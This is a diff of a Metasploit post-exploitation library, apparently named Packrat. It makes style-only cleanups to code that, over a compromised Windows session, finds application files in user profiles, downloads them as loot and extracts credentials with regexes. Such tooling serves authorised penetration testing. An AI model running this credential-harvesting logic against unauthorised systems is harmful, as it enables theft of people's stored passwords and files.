@@ -16,7 +16,7 @@ module Msf
         include Msf::Post::Windows::UserProfiles
 
         # Check to see if the application base folder exists on the remote system.
-        def is_parent_folder_available(path, dir, application)
+        def parent_folder_available?(path, dir, application)
           dirs = session.fs.dir.foreach(path).collect
           return dirs.include? dir
         end
@@ -26,12 +26,11 @@ module Msf
           files = session.fs.file.search(file_directory, artifact.to_s, true)
 
           #Checks if the file was found in the application's bas file
-          if files.empty?()
+          if files.empty?
             vprint_error("#{application.capitalize}'s #{artifact.capitalize} not found in #{userprofile['UserName']}'s user directory\n")
           else
             print_status("#{application.capitalize}'s #{artifact.capitalize} file found")
           end
-
           return files
         end
 
@@ -76,7 +75,7 @@ module Msf
             reg_child[:regex].map { |r| Regexp.new(r) }.each do |regex_to_match|
               if file_string =~ regex_to_match
                 file_string.scan(regex_to_match).each do |found_credential|
-                  file_strip = found_credential.gsub(/\s+/, "").to_s
+                  file_strip = found_credential.gsub(/\s+/, '').to_s
                   vprint_status(reg_child[:extraction_description].to_s)
                   print_good file_strip
                   credential_array << file_strip
@@ -87,7 +86,7 @@ module Msf
 
           if file_string =~ user_regex
             file_string.scan(user_regex).each do |user_match|
-              user_strip = user_match.gsub(/\s+/, "").to_s
+              user_strip = user_match.gsub(/\s+/, '').to_s
               vprint_status "Searching for #{regex_string}"
               print_good user_strip.to_s
               credential_array << user_strip
@@ -165,11 +164,10 @@ module Msf
           session.fs.file.download_file(saving_path, file_to_download)
           print_status("#{application.capitalize} #{file['name'].capitalize} downloaded")
           print_good("File saved to:  #{saving_path}\n")
-
         end
 
         def run_packrat(userprofile, opts = {})
-          vprint_status "Starting Packrat..."
+          vprint_status 'Starting Packrat...'
           artifact_parent = opts[:gatherable_artifacts]
           application = opts[:application]
 
@@ -180,45 +178,45 @@ module Msf
             path = userprofile[artifact_child[:path]]
             credential_type = artifact_child[:credential_type]
 
-            #Checks if the current artifact matches the search criteria
+            # Checks if the current artifact matches the search criteria
             if (file_type != datastore['ARTIFACTS'] && datastore['ARTIFACTS'] != 'All')
-              # doesn't match search criteria, skip this artifact
+              # Doesn't match search criteria, skip this artifact
               vprint_status "Skipping #{file_type} due to unmatched artifact type"
               next
             end
 
-            # check if the applications's base folder exists in user's directory on the remote computer.
-            if is_parent_folder_available(path, dir, application)
+            # Check if the applications's base folder exists in user's directory on the remote computer.
+            if parent_folder_available?(path, dir, application)
               print_status("#{application.capitalize}'s parent folder found")
             else
               vprint_error("#{application.capitalize}'s parent folder not found in #{userprofile['UserName']}'s user directory\n")
               # skip non-existing file
-              #next
+              # next
             end
 
-            #Get the files that matches the pre-defined artifact name
+            # Get the files that matches the pre-defined artifact name
             found_files = find_files(userprofile, application, artifact, path, dir)
 
-            #Checks if the user have disabled STORE_LOOT option or if no file was found. Go to next in such case
+            # Checks if the user have disabled STORE_LOOT option or if no file was found. Go to next in such case
             if found_files.empty?
               vprint_error "Skipping #{artifact} since it was not found on the user's folder."
               next
             elsif !datastore['STORE_LOOT']
-              print_good "File was found but STORE_LOOT option is disabled. File was not saved"
+              print_good 'File was found but STORE_LOOT option is disabled. File was not saved'
               next
             end
 
-            #Download each files found
+            # Download each files found
             found_files.each do |file|
 
-              vprint_status "Processing #{file["path"]}"
+              vprint_status "Processing #{file['path']}"
 
-              file_split = file["path"].split('\\')
-              local_loc = "#{file_split.last}#{file["name"]}"
-              saving_path = store_loot("#{application}#{file["name"]}", '', session, file["name"], local_loc)
-              file_to_download = "#{file["path"]}#{session.fs.file.separator}#{file["name"]}"
+              file_split = file['path'].split('\\')
+              local_loc = "#{file_split.last}#{file['name']}"
+              saving_path = store_loot("#{application}#{file['name']}", '', session, file['name'], local_loc)
+              file_to_download = "#{file['path']}#{session.fs.file.separator}#{file['name']}"
 
-              #Download file
+              # Download file
               download_file(saving_path, file_to_download, file, application)
 
               if datastore['EXTRACT_CREDENTIALS']
@@ -232,15 +230,12 @@ module Msf
                 when 'sqlite'
                   extract_sqlite(saving_path, artifact_child, artifact, local_loc)
                 else
-                  vprint_error "This artifact does not support any extraction type"
+                  vprint_error 'This artifact does not support any extraction type'
                 end
               else
-                vprint_status "Credentials are not extracted"
-
+                vprint_status 'Credentials are not extracted'
               end
-
             end
-
           end
         end
       end
